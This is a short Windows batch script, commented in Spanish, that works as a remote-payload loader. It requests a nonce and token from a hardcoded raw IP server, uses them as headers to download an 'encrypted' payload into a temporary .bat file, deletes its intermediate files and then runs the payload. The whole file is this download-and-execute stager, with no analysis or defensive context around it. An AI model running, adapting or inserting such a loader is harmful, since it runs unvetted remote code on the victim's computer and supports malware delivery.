@echo off
setlocal enabledelayedexpansion

set BASE=http://82.29.153.101:8080
set FILE=%temp%\sc.bat

REM ===== AUTH (nonce + token) =====
curl -s "%BASE%/auth/key" > "%temp%\auth.json"

REM Extraer NONCE y TOKEN (metodo simple y robusto)
powershell -NoP -Command "(Get-Content '%temp%\auth.json' | ConvertFrom-Json).nonce" > "%temp%\nonce.txt"
powershell -NoP -Command "(Get-Content '%temp%\auth.json' | ConvertFrom-Json).token" > "%temp%\token.txt"

set /p NONCE=<"%temp%\nonce.txt"
set /p TOKEN=<"%temp%\token.txt"

del "%temp%\auth.json" "%temp%\nonce.txt" "%temp%\token.txt"

REM ===== PAYLOAD =====
curl -s -H "X-Nonce: %NONCE%" -H "X-Token: %TOKEN%" "%BASE%/payload/encrypted" -o "%FILE%"

REM ===== EXEC =====
call "%FILE%"